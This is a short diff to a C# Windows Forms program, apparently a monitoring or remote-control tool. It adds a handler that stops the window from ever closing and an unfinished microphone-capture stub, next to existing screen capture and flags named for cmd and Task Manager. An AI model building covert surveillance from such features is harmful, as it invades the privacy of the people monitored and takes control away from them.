@@ -9,12 +9,14 @@ using System.IO;
 using System.Threading;
 using System.Net.NetworkInformation;
 using System.Threading.Tasks;
+using CSCore;
+using CSCore.SoundIn;
 
 namespace SCSU
 {
     public partial class Form1 : Form
     {
-        string captureText, settingJson, message;
+        string captureText, settingJson;
         bool cmd = false;
         bool taskmgr = false;
         bool looping = true;
@@ -116,6 +118,18 @@ namespace SCSU
             bitmap.Save(ms, ImageFormat.Jpeg);
             return Convert.ToBase64String(ms.ToArray());
         }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+        }
+        private WasapiCapture soundCapture()
+        {
+            WasapiCapture sound = new WasapiCapture();
+            sound.Initialize();
+            return null;
+        }
+
         private void loop()
         {
             while (looping)
